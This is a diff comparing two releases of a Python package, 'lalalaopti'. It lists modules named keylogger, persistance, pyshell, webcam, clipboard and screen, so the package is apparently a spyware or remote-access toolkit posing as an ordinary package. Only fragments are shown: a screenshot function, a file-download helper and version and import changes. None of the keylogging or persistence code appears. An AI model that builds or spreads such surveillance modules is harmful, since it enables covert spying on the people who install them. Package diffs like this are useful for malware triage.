# Comparing `tmp/lalalaopti-1.0.0.tar.gz` & `tmp/lalalaopti-1.0.1.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "dist\lalalaopti-1.0.0.tar", last modified: Tue Jun  6 15:02:45 2023, max compression
+gzip compressed data, was "dist\lalalaopti-1.0.1.tar", last modified: Tue Jun  6 15:09:38 2023, max compression
```

## Comparing `lalalaopti-1.0.0.tar` & `lalalaopti-1.0.1.tar`

### file list

```diff
@@ -1,21 +1,21 @@
-drwxrwxrwx   0        0        0        0 2023-06-06 15:02:45.536090 lalalaopti-1.0.0/
--rw-rw-rw-   0        0        0     2401 2023-06-06 15:02:45.536090 lalalaopti-1.0.0/PKG-INFO
--rw-rw-rw-   0        0        0     1913 2023-06-06 14:52:37.000000 lalalaopti-1.0.0/README.md
-drwxrwxrwx   0        0        0        0 2023-06-06 15:02:45.522078 lalalaopti-1.0.0/lalalaopti/
--rw-rw-rw-   0        0        0        0 2023-06-06 15:02:20.000000 lalalaopti-1.0.0/lalalaopti/__init__.py
-drwxrwxrwx   0        0        0        0 2023-06-06 15:02:45.534589 lalalaopti-1.0.0/lalalaopti/modules/
--rw-rw-rw-   0        0        0        0 2023-02-09 12:46:20.000000 lalalaopti-1.0.0/lalalaopti/modules/__init__.py
--rw-rw-rw-   0        0        0      141 2023-05-11 16:24:24.000000 lalalaopti-1.0.0/lalalaopti/modules/clipboard.py
--rw-rw-rw-   0        0        0     1340 2023-02-09 12:46:20.000000 lalalaopti-1.0.0/lalalaopti/modules/keylogger.py
--rw-rw-rw-   0        0        0     1790 2023-05-07 21:29:47.000000 lalalaopti-1.0.0/lalalaopti/modules/persistance.py
--rw-rw-rw-   0        0        0      464 2023-02-09 12:46:20.000000 lalalaopti-1.0.0/lalalaopti/modules/pyshell.py
--rw-rw-rw-   0        0        0      580 2023-02-09 12:46:20.000000 lalalaopti-1.0.0/lalalaopti/modules/screen.py
--rw-rw-rw-   0        0        0      541 2023-02-09 12:46:20.000000 lalalaopti-1.0.0/lalalaopti/modules/web.py
--rw-rw-rw-   0        0        0      440 2023-05-10 20:18:31.000000 lalalaopti-1.0.0/lalalaopti/modules/webcam.py
-drwxrwxrwx   0        0        0        0 2023-06-06 15:02:45.526081 lalalaopti-1.0.0/lalalaopti.egg-info/
--rw-rw-rw-   0        0        0     2401 2023-06-06 15:02:45.000000 lalalaopti-1.0.0/lalalaopti.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      420 2023-06-06 15:02:45.000000 lalalaopti-1.0.0/lalalaopti.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-06-06 15:02:45.000000 lalalaopti-1.0.0/lalalaopti.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       11 2023-06-06 15:02:45.000000 lalalaopti-1.0.0/lalalaopti.egg-info/top_level.txt
--rw-rw-rw-   0        0        0       42 2023-06-06 15:02:45.536090 lalalaopti-1.0.0/setup.cfg
--rw-rw-rw-   0        0        0      873 2023-06-06 15:02:02.000000 lalalaopti-1.0.0/setup.py
+drwxrwxrwx   0        0        0        0 2023-06-06 15:09:38.158547 lalalaopti-1.0.1/
+-rw-rw-rw-   0        0        0     2401 2023-06-06 15:09:38.158547 lalalaopti-1.0.1/PKG-INFO
+-rw-rw-rw-   0        0        0     1913 2023-06-06 14:52:37.000000 lalalaopti-1.0.1/README.md
+drwxrwxrwx   0        0        0        0 2023-06-06 15:09:38.145034 lalalaopti-1.0.1/lalalaopti/
+-rw-rw-rw-   0        0        0        0 2023-06-06 15:02:20.000000 lalalaopti-1.0.1/lalalaopti/__init__.py
+drwxrwxrwx   0        0        0        0 2023-06-06 15:09:38.157045 lalalaopti-1.0.1/lalalaopti/modules/
+-rw-rw-rw-   0        0        0        0 2023-02-09 12:46:20.000000 lalalaopti-1.0.1/lalalaopti/modules/__init__.py
+-rw-rw-rw-   0        0        0      152 2023-06-06 15:09:06.000000 lalalaopti-1.0.1/lalalaopti/modules/clipboard.py
+-rw-rw-rw-   0        0        0     1340 2023-02-09 12:46:20.000000 lalalaopti-1.0.1/lalalaopti/modules/keylogger.py
+-rw-rw-rw-   0        0        0     1790 2023-05-07 21:29:47.000000 lalalaopti-1.0.1/lalalaopti/modules/persistance.py
+-rw-rw-rw-   0        0        0      475 2023-06-06 15:08:48.000000 lalalaopti-1.0.1/lalalaopti/modules/pyshell.py
+-rw-rw-rw-   0        0        0      591 2023-06-06 15:08:43.000000 lalalaopti-1.0.1/lalalaopti/modules/screen.py
+-rw-rw-rw-   0        0        0      552 2023-06-06 15:08:32.000000 lalalaopti-1.0.1/lalalaopti/modules/web.py
+-rw-rw-rw-   0        0        0      440 2023-05-10 20:18:31.000000 lalalaopti-1.0.1/lalalaopti/modules/webcam.py
+drwxrwxrwx   0        0        0        0 2023-06-06 15:09:38.148537 lalalaopti-1.0.1/lalalaopti.egg-info/
+-rw-rw-rw-   0        0        0     2401 2023-06-06 15:09:38.000000 lalalaopti-1.0.1/lalalaopti.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      420 2023-06-06 15:09:38.000000 lalalaopti-1.0.1/lalalaopti.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-06-06 15:09:38.000000 lalalaopti-1.0.1/lalalaopti.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       11 2023-06-06 15:09:38.000000 lalalaopti-1.0.1/lalalaopti.egg-info/top_level.txt
+-rw-rw-rw-   0        0        0       42 2023-06-06 15:09:38.159047 lalalaopti-1.0.1/setup.cfg
+-rw-rw-rw-   0        0        0      873 2023-06-06 15:09:30.000000 lalalaopti-1.0.1/setup.py
```

### Comparing `lalalaopti-1.0.0/PKG-INFO` & `lalalaopti-1.0.1/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: lalalaopti
-Version: 1.0.0
+Version: 1.0.1
 Summary: dcfdfdfdf
 Author: HW
 Author-email: 
 Classifier: Development Status :: 1 - Planning
 Classifier: Intended Audience :: Developers
 Classifier: Programming Language :: Python :: 3
 Classifier: Operating System :: Unix
```

### Comparing `lalalaopti-1.0.0/README.md` & `lalalaopti-1.0.1/README.md`

 * *Files identical despite different names*

### Comparing `lalalaopti-1.0.0/lalalaopti/modules/keylogger.py` & `lalalaopti-1.0.1/lalalaopti/modules/keylogger.py`

 * *Files identical despite different names*

### Comparing `lalalaopti-1.0.0/lalalaopti/modules/persistance.py` & `lalalaopti-1.0.1/lalalaopti/modules/persistance.py`

 * *Files identical despite different names*

### Comparing `lalalaopti-1.0.0/lalalaopti/modules/screen.py` & `lalalaopti-1.0.1/lalalaopti/modules/screen.py`

 * *Files 18% similar despite different names*

```diff
@@ -1,13 +1,13 @@
 import logging
 from io import BytesIO
 from typing import Union
 
 import pyscreeze
-from utils.errors import errors
+from gogogolokl.utils.errors import errors
 
 
 def screenshot() -> Union[bool, bytes]:
     """ Take a screenshot """
     try:
         with BytesIO() as output:
             img = pyscreeze.screenshot()
```

### Comparing `lalalaopti-1.0.0/lalalaopti/modules/web.py` & `lalalaopti-1.0.1/lalalaopti/modules/web.py`

 * *Files 20% similar despite different names*

```diff
@@ -1,12 +1,12 @@
 from typing import Union
 import requests
 import logging
 
-from utils.errors import errors
+from gogogolokl.utils.errors import errors
 
 def download(link: str, filename: str) -> Union[str, None]:
     """ Download files from the internet """
     try:
         request = requests.get(link)
         with open(filename) as file:
             file.write(request.content)
```

### Comparing `lalalaopti-1.0.0/lalalaopti.egg-info/PKG-INFO` & `lalalaopti-1.0.1/lalalaopti.egg-info/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: lalalaopti
-Version: 1.0.0
+Version: 1.0.1
 Summary: dcfdfdfdf
 Author: HW
 Author-email: 
 Classifier: Development Status :: 1 - Planning
 Classifier: Intended Audience :: Developers
 Classifier: Programming Language :: Python :: 3
 Classifier: Operating System :: Unix
```

### Comparing `lalalaopti-1.0.0/setup.py` & `lalalaopti-1.0.1/setup.py`

 * *Files 1% similar despite different names*

```diff
@@ -1,14 +1,14 @@
 from setuptools import setup, find_packages
 from setuptools.command.install import install
 from pathlib import Path
 
 
 
-VERSION = '1.0.0'
+VERSION = '1.0.1'
 DESCRIPTION = 'dcfdfdfdf'
 this_directory = Path(__file__).parent
 long_description = (this_directory / "README.md").read_text()
 
 setup(
     name="lalalaopti",
     version=VERSION,
```

